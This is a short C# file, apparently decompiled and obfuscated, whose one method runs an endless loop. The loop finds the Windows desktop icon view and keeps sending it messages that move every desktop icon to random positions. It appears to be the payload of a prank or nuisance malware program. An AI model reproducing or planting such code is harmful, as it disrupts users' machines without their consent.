using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

// Token: 0x0200002B RID: 43
public class GClass10
{
	// Token: 0x060000C2 RID: 194 RVA: 0x00005FD4 File Offset: 0x000041D4
	public void method_0()
	{
		for (;;)
		{
			Random random = new Random();
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			IntPtr intPtr = GClass2.FindWindow("Progman", null);
			intPtr = GClass2.FindWindowEx(intPtr, IntPtr.Zero, "SHELLDLL_DefView", null);
			intPtr = GClass2.FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", null);
			FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles();
			for (int i = 0; i <= files.Length + 2; i++)
			{
				GClass2.SendMessage(intPtr, 4111U, (IntPtr)i, GClass2.smethod_0(random.Next(width), random.Next(height)));
				Thread.Sleep(random.Next(300, 500));
			}
		}
	}
}
